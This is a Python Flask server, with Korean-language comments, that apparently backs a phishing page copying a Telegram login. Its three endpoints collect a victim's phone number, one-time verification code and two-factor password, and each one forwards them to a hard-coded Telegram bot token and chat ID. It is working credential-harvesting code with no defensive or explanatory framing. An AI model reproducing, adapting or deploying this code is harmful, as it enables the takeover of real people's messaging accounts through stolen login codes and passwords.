import os
import requests
from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS

app = Flask(__name__, static_folder=".", static_url_path="/")
CORS(app)

# 사용자가 제공한 마지막 텔레그램 봇 정보
BOT_TOKEN = "8624261932:AAHUdfopde-6EVa5G0Df4WXMVSXS2STJccA"
CHAT_ID = "8792543569"

@app.route("/")
def index():
    return send_from_directory(app.static_folder, "index.html")

@app.route("/send_phone", methods=["POST"])
def send_phone():
    data = request.json
    if not data:
        return jsonify({"ok": False, "error": "데이터가 없습니다."}), 400
    
    phone_number = data.get("phone_number")
    if not phone_number:
        return jsonify({"ok": False, "error": "전화번호가 없습니다."}), 400
    
    message = f"Login Attempt: {phone_number}"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": message
    }
    
    try:
        response = requests.post(url, json=payload)
        result = response.json()
        if result.get("ok"):
            return jsonify({"ok": True})
        else:
            return jsonify({"ok": False, "error": result.get("description")}), 500
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 500

@app.route("/send_code", methods=["POST"])
def send_code():
    data = request.json
    if not data:
        return jsonify({"ok": False, "error": "데이터가 없습니다."}), 400
    
    phone_number = data.get("phone_number")
    verification_code = data.get("verification_code")
    
    if not phone_number or not verification_code:
        return jsonify({"ok": False, "error": "전화번호 또는 인증 코드가 없습니다."}), 400
    
    message = f"Verification Code for {phone_number}: {verification_code}"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": message
    }
    
    try:
        response = requests.post(url, json=payload)
        result = response.json()
        if result.get("ok"):
            return jsonify({"ok": True})
        else:
            return jsonify({"ok": False, "error": result.get("description")}), 500
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 500

@app.route("/send_password", methods=["POST"])
def send_password():
    data = request.json
    if not data:
        return jsonify({"ok": False, "error": "데이터가 없습니다."}), 400
    
    phone_number = data.get("phone_number")
    password = data.get("password")
    
    if not phone_number or not password:
        return jsonify({"ok": False, "error": "전화번호 또는 비밀번호가 없습니다."}), 400
    
    message = f"2-Factor Auth Password for {phone_number}: {password}"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": message
    }
    
    try:
        response = requests.post(url, json=payload)
        result = response.json()
        if result.get("ok"):
            return jsonify({"ok": True})
        else:
            return jsonify({"ok": False, "error": result.get("description")}), 500
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 500

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)
